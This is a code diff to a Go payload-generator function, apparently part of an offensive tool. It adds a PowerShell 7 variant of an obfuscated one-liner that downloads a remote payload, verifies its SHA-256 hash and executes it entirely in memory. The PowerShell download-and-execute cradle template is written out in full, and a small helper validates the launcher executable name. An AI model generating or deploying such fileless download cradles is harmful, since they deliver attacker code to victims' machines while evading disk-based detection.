@@ -374,6 +374,16 @@ func buildOneLinersWithObfuscation(payloadType, ps1Code, payloadURL, hostPath, p
 					ps1VerifiedMemoryLoader(payloadURL, sha256hex), psOpts),
 			})
 		}
+		if sha256hex != "" && !strings.EqualFold(psOpts.LauncherExe, "pwsh") {
+			pwshOpts := psOpts
+			pwshOpts.LauncherExe = "pwsh"
+			items = append(items, oneLinerItem{
+				Name: "PowerShell 7 (pwsh) Verified Memory Load",
+				Desc: "Same memory-only verified cradle with an explicit pwsh (PowerShell 7+) launcher",
+				Command: obfuscation.GenerateCommandLineOneLinerWithOptions(
+					ps1VerifiedMemoryLoader(payloadURL, sha256hex), pwshOpts),
+			})
+		}
 
 	case "linux":
 		items = append(items, oneLinerItem{
@@ -435,4 +445,20 @@ func buildOneLinersWithObfuscation(payloadType, ps1Code, payloadURL, hostPath, p
 func ps1VerifiedMemoryLoader(payloadURL, sha256hex string) string {
 	return fmt.Sprintf(`$u='%s';$h='%s';$wc=New-Object Net.WebClient;for($i=0;$i -lt 3;$i++){try{$b=$wc.DownloadData($u);$d=[BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($b)).Replace('-','').ToLower();if($d -eq $h){([ScriptBlock]::Create([Text.Encoding]::UTF8.GetString($b))).Invoke();break}}catch{};Start-Sleep -Seconds 2}`,
 		strings.ReplaceAll(payloadURL, "'", "''"), strings.ToLower(sha256hex))
+}
+
+// normalizePowerShellExe accepts only the two shipped PowerShell executables
+// (or auto/empty) so an operator-supplied launcher name cannot turn into an
+// arbitrary executable in the generated one-liner.
+func normalizePowerShellExe(value string) (string, bool) {
+	switch strings.ToLower(strings.TrimSpace(value)) {
+	case "", "auto":
+		return "", true
+	case "powershell":
+		return "powershell", true
+	case "pwsh":
+		return "pwsh", true
+	default:
+		return "", false
+	}
 }
